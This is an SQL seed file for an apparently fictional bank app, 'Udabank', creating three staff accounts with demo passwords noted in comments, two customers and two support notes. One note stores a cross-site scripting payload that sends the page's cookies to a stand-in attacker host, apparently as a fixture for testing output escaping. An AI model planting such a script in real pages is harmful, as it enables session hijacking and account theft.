-- Udabank seed data.
-- Passwords are Argon2id-hashed (PHC string format), matching what
-- Spring Security's Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8() produces.
--
-- priya  / AuditReady!2025  -> role ADMIN
-- marcus / QueueZero!2025   -> role SUPPORT (assigned to customer 1)
-- sana   / TicketDesk!2025  -> role SUPPORT (assigned to customer 2)

INSERT INTO users (username, password, enabled, role) VALUES
('priya',  '$argon2id$v=19$m=19456,t=2,p=1$yK6wQ13vlfVSqmTlY9J6Pw$1ckYR70+TsSrpwEzJeVg+mg8f+Tws8CL7aJC4ZiNe5s', true, 'ADMIN'),
('marcus', '$argon2id$v=19$m=19456,t=2,p=1$i8JTezaiqw4iz0Zyoq35Iw$gHyPFvlnewgl+BSqKBbQNEbkPQc/lx8r/5d4ub0MP+c', true, 'SUPPORT'),
('sana',   '$argon2id$v=19$m=19456,t=2,p=1$iIycgWDm9CgV7EE34zjFVw$S4Xr+/L9mFDMadSuWvmGxoAEetUo6p/BqyMxCZcj35Y', true, 'SUPPORT');

INSERT INTO customers (id, full_name, account_number, assigned_agent_username) VALUES
(1, 'Ridgeline Manufacturing Co.', 'UDB-10234', 'marcus'),
(2, 'Alder and Finch LLP', 'UDB-88217', 'sana');

INSERT INTO support_notes (id, customer_id, author_username, body) VALUES
(1, 1, 'marcus', 'Called about a delayed ACH transfer, resolved same day.'),
(2, 2, 'sana', 'Customer pasted this into the chat widget verbatim: <script>document.location=''https://evil-lookalike.example/steal?c=''+document.cookie</script> Also asked about wire transfer limits.');
